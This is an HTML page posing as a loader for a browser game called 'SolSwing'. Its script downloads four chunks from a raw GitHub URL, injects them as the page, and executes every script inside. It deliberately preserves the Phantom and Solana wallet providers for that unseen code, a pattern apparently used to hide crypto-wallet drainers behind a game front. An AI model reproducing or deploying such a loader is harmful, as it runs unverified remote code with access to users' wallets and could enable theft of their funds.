<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SolSwing</title>
<style>body{background:#0a0a0a;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center} .bar{width:200px;height:8px;background:#333;border-radius:4px;margin:20px auto;overflow:hidden} .fill{height:100%;background:#4ade80;width:0%;transition:width .3s}</style>
</head>
<body>
<div id="loader">
<h2>🎮 SolSwing</h2>
<p id="status">Loading game...</p>
<div class="bar"><div class="fill" id="fill"></div></div>
</div>
<script>
(async function() {
  const chunks = ['chunk_aa.txt','chunk_ab.txt','chunk_ac.txt','chunk_ad.txt'];
  const base = 'https://raw.githubusercontent.com/devsolswing/Solswing-server/main/ios/';
  let html = '';
  for (let i = 0; i < chunks.length; i++) {
    document.getElementById('status').textContent = 'Loading part ' + (i+1) + ' of 4...';
    document.getElementById('fill').style.width = ((i/chunks.length)*100) + '%';
    const res = await fetch(base + chunks[i]);
    html += await res.text();
  }
  // Save Phantom provider before replacing document
  const savedPhantom = window.phantom;
  const savedSolana = window.solana;
  
  // Parse and inject without document.write (preserves window)
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  document.head.innerHTML = doc.head.innerHTML;
  document.body.innerHTML = doc.body.innerHTML;
  
  // Restore Phantom provider if lost
  if (savedPhantom && !window.phantom) window.phantom = savedPhantom;
  if (savedSolana && !window.solana) window.solana = savedSolana;
  
  // Execute scripts in order
  const scripts = Array.from(doc.querySelectorAll('script'));
  for (const oldScript of scripts) {
    const newScript = document.createElement('script');
    if (oldScript.src) {
      newScript.src = oldScript.src;
      // Wait for external scripts
      await new Promise((resolve, reject) => {
        newScript.onload = resolve;
        newScript.onerror = resolve;
        document.body.appendChild(newScript);
      });
    } else {
      newScript.textContent = oldScript.textContent;
      document.body.appendChild(newScript);
    }
  }
  
  // Fire DOMContentLoaded and load events for game init code that waits for them
  // (the loader page already fired these, so injected scripts miss them)
  setTimeout(function() {
    document.dispatchEvent(new Event('DOMContentLoaded', {bubbles: true}));
    window.dispatchEvent(new Event('load'));
    // Also try common init function names
    if (typeof window.init === 'function') window.init();
    if (typeof window.startGame === 'function') window.startGame();
  }, 100);
})();
</script>
</body>
</html>
